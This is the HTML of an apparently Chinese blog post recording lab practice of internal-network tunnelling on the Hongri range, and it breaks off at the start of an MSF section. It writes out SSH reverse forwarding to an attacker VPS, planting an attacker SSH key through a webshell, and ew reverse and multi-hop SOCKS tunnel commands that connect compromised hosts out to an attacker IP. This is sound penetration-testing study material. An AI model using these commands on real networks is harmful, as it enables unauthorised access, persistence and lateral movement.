@@ -1,0 +1,1600 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="学习一下内网通信隧道，之前了解了一下，感觉不大够">
+<title>内网通信隧道学习</title>
+
+<link rel='canonical' href='https://xxxxctfer.github.io/p/%E5%86%85%E7%BD%91%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E5%AD%A6%E4%B9%A0/'>
+
+<link rel="stylesheet" href="/scss/style.min.1ae76ab9aa3beab52f99d9b5f59d64d06778453e93ff523a98332d15179df142.css"><meta property='og:title' content="内网通信隧道学习">
+<meta property='og:description' content="学习一下内网通信隧道，之前了解了一下，感觉不大够">
+<meta property='og:url' content='https://xxxxctfer.github.io/p/%E5%86%85%E7%BD%91%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E5%AD%A6%E4%B9%A0/'>
+<meta property='og:site_name' content='xxxx'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-31T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-31T00:00:00&#43;00:00'/><meta property='og:image' content='https://xxxxctfer.github.io/images/hongri/suidao/suidao2.png' />
+<meta name="twitter:title" content="内网通信隧道学习">
+<meta name="twitter:description" content="学习一下内网通信隧道，之前了解了一下，感觉不大够"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://xxxxctfer.github.io/images/hongri/suidao/suidao2.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a014c1f4876185e.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥰</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">xxxx</a></h1>
+            <h2 class="site-description">一个还在努力的xxxx</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/xxxxctfer'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc stack-toc">
+            <ol class="toc-level-1"><li class="toc-item-h1">
+                        <a href="#%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91ssh%e9%9a%a7%e9%81%93%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91%28SSH%e9%9a%a7%e9%81%93%29%0a%3c%2fh1%3e" aria-label="端口转发(SSH隧道) ">端口转发(SSH隧道) </a><ol class="toc-level-2"><li class="toc-item-h2">
+                        <a href="#%e8%a6%81%e6%b1%82%e8%a6%81%e6%b1%82%0a%3c%2fh2%3e" aria-label="要求 ">要求 </a><li class="toc-item-h2">
+                        <a href="#%e5%8a%a8%e6%80%81%e8%bd%ac%e5%8f%91%e5%8a%a8%e6%80%81%e8%bd%ac%e5%8f%91%0a%3c%2fh2%3e" aria-label="动态转发 ">动态转发 </a><li class="toc-item-h2">
+                        <a href="#%e5%8f%8d%e5%90%91%e8%bd%ac%e5%8f%91%e5%8f%8d%e5%90%91%e8%bd%ac%e5%8f%91%0a%3c%2fh2%3e" aria-label="反向转发 ">反向转发 </a><li class="toc-item-h2">
+                        <a href="#webshell%e6%80%8e%e4%b9%88%e6%89%93ssh%e5%91%bd%e4%bb%a4webshell%e6%80%8e%e4%b9%88%e6%89%93ssh%e5%91%bd%e4%bb%a4%0a%3c%2fh2%3e" aria-label="webshell怎么打ssh命令 ">webshell怎么打ssh命令 </a></ol></li><li class="toc-item-h1">
+                        <a href="#socks5-%e9%9a%a7%e9%81%93Socks5%20%e9%9a%a7%e9%81%93%0a%3c%2fh1%3e" aria-label="Socks5 隧道 ">Socks5 隧道 </a><ol class="toc-level-2"><li class="toc-item-h2">
+                        <a href="#ewew%0a%3c%2fh2%3e" aria-label="ew ">ew </a><ol class="toc-level-3"></ol></li></ol></li><li class="toc-item-h1">
+                        <a href="#%e5%b7%a5%e5%85%b7%e5%86%85%e7%bd%ae%e5%b7%a5%e5%85%b7%e5%86%85%e7%bd%ae%0a%3c%2fh1%3e" aria-label="工具内置 ">工具内置 </a><ol class="toc-level-2"><li class="toc-item-h2">
+                        <a href="#msfMSF%0a%3c%2fh2%3e" aria-label="MSF ">MSF </a></ol></li><li class="toc-item-h1">
+                        <a href="#%e5%ba%94%e7%94%a8%e5%b1%82%e5%b0%81%e8%a3%85%e9%9a%a7%e9%81%93%e5%ba%94%e7%94%a8%e5%b1%82%e5%b0%81%e8%a3%85%e9%9a%a7%e9%81%93%0a%3c%2fh1%3e" aria-label="应用层封装隧道 ">应用层封装隧道 </a><ol class="toc-level-2"><li class="toc-item-h2">
+                        <a href="#http-%e9%9a%a7%e9%81%93neo-regeorgHTTP%20%e9%9a%a7%e9%81%93%ef%bc%9aNeo-reGeorg%0a%3c%2fh2%3e" aria-label="HTTP 隧道：Neo-reGeorg ">HTTP 隧道：Neo-reGeorg </a><li class="toc-item-h2">
+                        <a href="#dns-%e9%9a%a7%e9%81%93dnscat2DNS%20%e9%9a%a7%e9%81%93%ef%bc%9adnscat2%0a%3c%2fh2%3e" aria-label="DNS 隧道：dnscat2 ">DNS 隧道：dnscat2 </a><li class="toc-item-h2">
+                        <a href="#icmp-%e9%9a%a7%e9%81%93ptunnelping-%e9%9a%a7%e9%81%93ICMP%20%e9%9a%a7%e9%81%93%ef%bc%9aptunnel%ef%bc%88Ping%20%e9%9a%a7%e9%81%93%ef%bc%89%0a%3c%2fh2%3e" aria-label="ICMP 隧道：ptunnel（Ping 隧道） ">ICMP 隧道：ptunnel（Ping 隧道） </a></ol></li><li class="toc-item-h1">
+                        <a href="#vpn%e4%b8%89%e7%ba%a7%e9%9a%a7%e9%81%93VPN%e4%b8%89%e7%ba%a7%e9%9a%a7%e9%81%93%0a%3c%2fh1%3e" aria-label="VPN三级隧道 ">VPN三级隧道 </a><ol class="toc-level-2"><li class="toc-item-h2">
+                        <a href="#wireguardWireGuard%0a%3c%2fh2%3e" aria-label="WireGuard ">WireGuard </a></ol></li><li class="toc-item-h1">
+                        <a href="#%e6%80%bb%e7%bb%93%e6%80%bb%e7%bb%93%0a%3c%2fh1%3e" aria-label="总结 ">总结 </a><li class="toc-item-h1">
+                        <a href="#%e5%86%85%e7%bd%91%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%86%85%e7%bd%91%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%0a%3c%2fh1%3e" aria-label="内网信息收集 ">内网信息收集 </a><ol class="toc-level-2"><li class="toc-item-h2">
+                        <a href="#%e5%9f%ba%e6%9c%ac%e6%80%9d%e8%b7%af%e5%9f%ba%e6%9c%ac%e6%80%9d%e8%b7%af%0a%3c%2fh2%3e" aria-label="基本思路 ">基本思路 </a><li class="toc-item-h2">
+                        <a href="#windows%e4%b8%bb%e6%9c%baWindows%e4%b8%bb%e6%9c%ba%0a%3c%2fh2%3e" aria-label="Windows主机 ">Windows主机 </a><li class="toc-item-h2">
+                        <a href="#linux%e4%b8%bb%e6%9c%baLinux%e4%b8%bb%e6%9c%ba%0a%3c%2fh2%3e" aria-label="Linux主机 ">Linux主机 </a></ol></li></ol></li></div>
+    </section>
+
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E5%86%85%E7%BD%91%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E5%AD%A6%E4%B9%A0/">
+                
+                    <img src="/images/hongri/suidao/suidao2.png" loading="lazy" alt="Featured image of post 内网通信隧道学习" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E4%BA%BA/" >
+                Web人
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E5%86%85%E7%BD%91%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E5%AD%A6%E4%B9%A0/">内网通信隧道学习</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            学习一下内网通信隧道，之前了解了一下，感觉不大够
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2026-03-31T00:00:00Z'>2026-03-31</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>目前主要还是使用工具为主，但是还是来系统学习一下常见的搭建方式，包括工具的使用方式，都总结收集一下。
+这里我们用的第一个红日靶场来打的，先拿webshell啊。</p>
+<p><img src="/images/hongri/suidao/suidao1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>还好之前的文件没删，虚拟机之前直接下线了。</p>
+<h1 id="端口转发ssh隧道">端口转发(SSH隧道)
+</h1><p>先来介绍一下端口转发是什么作用，以及应用于什么场景。
+简单来说就是将外网端口映射到本地端口来，比如我将192.168.200.143的3306端口(Mysql)，与我本地的3306端口进行转发，那么我访问本地的3306端口时，就通过主机去进行了一个转发，访问到了这台主机的3306端口。
+这种方式最常见的就是通过SSH隧道去搭建端口转发的隧道。</p>
+<h2 id="要求">要求
+</h2><p>这种有一些最基本的要求，大部分时候是有可能满足的。</p>
+<ol>
+<li>有SSH服务(开启22端口)</li>
+<li>有SSH私钥或有账号密码(可以进行连接)</li>
+<li>服务器上出网的
+主要就是这样的一些要求，我们的这台192.168.200.143本来是没有的，我们下载一下。然后我们的Windows都可以自己连上了。然后我们来连一下吧。</li>
+</ol>
+<p><img src="/images/hongri/suidao/suidao3.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，这里就连好了，我们来试一下端口转发。其实一般这种情况，拿到SSH连接到交互式shell之后可以做的就很多了，这里我们只讲SSH连接可以搭的隧道。这里稍微提一下怎么拿到账号密码的，这里的防护做的比较简单，密码可以随意修改。</p>
+<p><img src="/images/hongri/suidao/suidao2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后就直接修改密码去登录了，还是比较简单的。(平常可能需要从数据库中再去查找)
+然后这里介绍比较常用的，SSH搭建隧道</p>
+<h2 id="动态转发">动态转发
+</h2><p>这里说的动态转发，其实是一种全端口的转发，先上命令吧。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh -D 1080 god/administrator@192.168.200.143
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后当我们打这个命令看到连接成功之后，我们可以直接在我们的本地看1080端口，已经开好了监听，具体怎么去访问别的东西呢，也很简单了。通过浏览器 / Proxifier / 漏洞工具去设置一个代理。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">代理类型：SOCKS5
+</span></span><span class="line"><span class="cl">地址：127.0.0.1
+</span></span><span class="line"><span class="cl">端口：1080
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们这里用Proxifier来试试。</p>
+<p><img src="/images/hongri/suidao/suidao4.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>可以看到成功通过隧道进行了流量转发，我们就可以通过这个进行全网段的一个访问了。还是比较轻松愉快的。这种情况一般</p>
+<h2 id="反向转发">反向转发
+</h2><p>当然，既然是内网攻防，那肯定有连不了的情况，比如这个时候还用SSH的隧道就需要用反向连接的方式。先讲明白是什么情况下吧。</p>
+<ol>
+<li>跳板机没有公网IP，或者防火墙禁止外网进行SSH连接。</li>
+<li>跳板机出网，可以访问网络资源
+可以拿红日第一个靶机的来举例，内网的域控是不出网的，但是可以ping到我们的win7，也就是跳板机，如果他有SSH，并且我们拿到了一个webshell，就可以进行一个反向连接，并且这个反向连接，也可以开上面的socket5代理。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh -N -R 1080 公网IP/vpsip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过这个就可以直接反向连出来，然后开全网段了。</p>
+<h2 id="webshell怎么打ssh命令">webshell怎么打ssh命令
+</h2><p>这里其实是一个老毛病，问题的根源在于打SSH命令，需要进行交互输入密码，而且后续也是交互式shell，这跟webshell是不一样的，所以就会卡死。我们这里简单记录一下webshell怎么去进行SSH的。
+最常见的方法其实就是用密钥进行连接了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在你的kali上，或者VPS上，安装ssh-keygen
+</span></span><span class="line"><span class="cl">ssh-keygen -t ed25519
+</span></span><span class="line"><span class="cl">mkdir C:\Users\Administrator\.ssh
+</span></span><span class="line"><span class="cl">echo 你的VPS公钥 &gt; C:\Users\Administrator\.ssh\authorized_keys
+</span></span><span class="line"><span class="cl">将公钥写进去之后，ssh连接可以直接用密钥连，就不需要交互了。
+</span></span><span class="line"><span class="cl">ssh -N -R 1080 root@你的VPS_IP -o StrictHostKeyChecking=no
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里稍微总结一下，在内网攻防中，基本上就是反向的隧道较多，如果用SSH的话。因为大部分情况是有webshell的情况，但是不一定能可以去SSH连接他，当然能SSH连接的情况，我们就可以直接开动态代理，然后全网段访问了。但是大部分还是密钥反向访问，或者用同网段的交互式shell进行SSH连接。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SSH隧道使用：
+</span></span><span class="line"><span class="cl">1. 确认是否有SSH服务(22端口)
+</span></span><span class="line"><span class="cl">2. 确认是否可以直接SSH连接
+</span></span><span class="line"><span class="cl">   2.1. 可以则直接开全网段
+</span></span><span class="line"><span class="cl">   2.2. 反向连接开全网段
+</span></span><span class="line"><span class="cl">   2.3. 不出网换隧道去打
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="socks5-隧道">Socks5 隧道
+</h1><p>这个主要讲两个比较常用的吧，多的还是不找了，说不定之后有更好用的工具也说不定。这里主要介绍ew，还有一个比较常见的gost，但是ew用的更多，这里就讲ew了。</p>
+<h2 id="ew">ew
+</h2><p>先给出工具链接吧：https://github.com/idlefire/ew。通过这个去下对应主机的已编译好的文件即可。
+通过webshell直接进行上传即可，然后有几种打的方式，这里也是讲常见的了，反向连接和正向连接。</p>
+<h3 id="反向连接">反向连接
+</h3><p>这种方式适用于主机可出网的情况。因为要出来连我们的攻击机，我们先上传好，然后本地开好(实际情况下需要VPS开)ew的监听。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ew.exe -s rcsocks -l 1080 -e 8888
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/hongri/suidao/suidao5.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后就是这个效果，然后我们去用蚁剑上面打连出来的命令。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ew.exe -s rssocks -d 攻击机IP -e 8888
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/hongri/suidao/suidao6.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后就会发现我们的命令行上面显示已经连上了，然后我们就可以用工具去连接我们的socket5隧道了。然后再去开那个配置就行。但是这里貌似有一点问题，看一下AI的分析吧。
+别看了，看结尾吧，没招了。AI分析错了，开虚拟机才知道是什么问题。</p>
+<p>所以就有点难绷，但是按理来说我前面的SSH都能打，为什么这个不能打，就很奇怪。可能有点什么问题吧，但是之前用ew打过二级隧道，我们这里把一级的先整完。</p>
+<h3 id="正向连接">正向连接
+</h3><p>这个其实不能叫连接，因为是在攻击机上开了一个socket5的代理，到了特定端口上，然后通过这个端口再去发的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">ew.exe -s ssocksd -l 1080 (被攻击机)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里就没演示了，比较麻烦，懒得整了，等会放一个靶场的运行图看吧。</p>
+<h3 id="总结命令">总结命令
+</h3><p>总结一下ew的命令，到时候方便拿。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">正向连接：
+</span></span><span class="line"><span class="cl">./ew -s ssocksd -l 8888 / ew.exe -s ssockse -l 8888
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">反向连接：
+</span></span><span class="line"><span class="cl">攻击机： ./ew -s rcsocks -l 1080 -e 8888  /  ew.exe -s rcsocks -l 1080 -e 8888
+</span></span><span class="line"><span class="cl">被攻击机： ./ew -s rssocks -d 攻击机IP -e 8888 / ew.exe -s rssocks -d 攻击机IP -e 8888
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">二级隧道：
+</span></span><span class="line"><span class="cl">靶机 A 能访问内网主机 B，你想通过 A 访问 B：
+</span></span><span class="line"><span class="cl">B：./ew -s ssocksd -l 9999 / ew.exe -s ssocksd -l 9999
+</span></span><span class="line"><span class="cl">A<span class="p">:</span> <span class="nl">./ew</span><span class="c1"> -s lcx_tran -l 1080 -f B主机IP -g 9999 / ew.exe -s lcx_tran -l 1080 -f B主机IP -g 9999</span>
+</span></span><span class="line"><span class="cl">攻击机：直接连A主机的1080端口进socket5代理
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">或者：
+</span></span><span class="line"><span class="cl">A 无法开端口，只能反弹
+</span></span><span class="line"><span class="cl">攻击机：./ew -s lcx_listen -l 1080 -e 8888 / ew.exe -s lcx_listen -l 1080 -e 8888
+</span></span><span class="line"><span class="cl">B：./ew -s ssocksd -l 9999 / ew.exe -s ssocksd -l 9999
+</span></span><span class="line"><span class="cl">A：./ew -s lcx_slave -d 攻击机IP -e 8888 -f B主机IP -g 9999 / ew.exe ......(省略)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/hongri/suidao/suidao7.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>这种就是成功连接上了，当然A主机也打了命令，但是这里就不展示了。</p>
+<p>后续呢还有一些工具没有展示，多学习就会用到的，比如gost，trp，nps，还有命令行连接socket5的proxychains。这里不多延伸了，有时间了解一下怎么用的。</p>
+<p><img src="/images/hongri/suidao/suidao8.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>我没招了，后续要打MSF的时候才看到，被防火墙拦了，跟NAT关系不大，那也没招了，把前面的解释删了。</p>
+<h1 id="工具内置">工具内置
+</h1><p>前面讲的都是比较基础的那些隧道，但是利用起来会比较麻烦，所有就会出现一些工具帮助搭建隧道，我们这里讲的就是CS和MSF，CS的已经用过了，具体看：https://xxxxctfer.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E7%AB%A0/
+但是可能没有讲到原理是怎么样的，其实就是上面的socket5的隧道，也是正向反向连接的，可能比较特殊的就是Listener的转发，通过通信协议去控制，建立隧道。当时上线的原理是通过拿到的明文密码写的后门，如果是没有密码可能就需要先搭建内网隧道，再去访问内部的web资源去攻击了，这里主要学习MSF的用法，就不介绍CS了，反正平常用CS更多。</p>
+<h2 id="msf">MSF
+</h2><p>命令启动和从webshell上传持续化后门。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
